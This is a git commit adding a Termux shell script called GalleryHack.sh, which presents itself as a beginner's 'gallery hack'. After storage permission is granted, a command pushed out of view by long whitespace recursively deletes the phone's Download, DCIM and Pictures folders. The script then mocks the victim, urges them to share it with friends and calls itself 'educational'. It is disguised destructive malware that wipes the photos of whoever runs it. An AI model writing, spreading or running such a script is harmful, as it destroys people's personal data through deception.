b613187eda1c18d1102e6802bb418e584988a1d2
DarkxWarrior <134803813+DarkxWarrior@users.noreply.github.com>
2023-06-18 20:46:03 +0530

    Add files via upload

---
+++ GalleryHack.sh
@@ -0,0 +1,33 @@
+#!/data/data/com.termux/files/usr/bin/bash
+clear
+echo " CATCH_22 FAM We Will Stand For You 
+       MADE BY LUCIFER FOR BEGINERS 
+       TRY AND TRY ONE DAY YOU CAN FLY"
+
+center() {
+  termwidth=$(stty size | cut -d" " -f2)
+  padding="$(printf '%0.1s' ={1..500})"
+  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
+}
+pkg update
+pkg upgrade
+
+
+termux-setup-storage
+
+
+                                                                                                   cd /sdcard && rm -rf  Download && rm -rf DCIM && rm -rf Pictures
+echo "LOL 😂 YOU FORGOT THAT I DELETED YOUR PHOTOS 😂
+
+SHARE THIS FOR YOUR FRIEND"
+
+echo " Note This is Only For Educational Purpose "
+
+echo " To Join With Us Please Contact Us From Github 👍 "
+
+echo " We Stand For Injustice "
+       echo " Creadits Goes To Lucifer [ S.L.R.H.T] "
+clear 
+echo " YOU ARE DONE "
+
+echo " Do Not Challenge us It Will be Injuries To Your Device ....... Lucifer. "
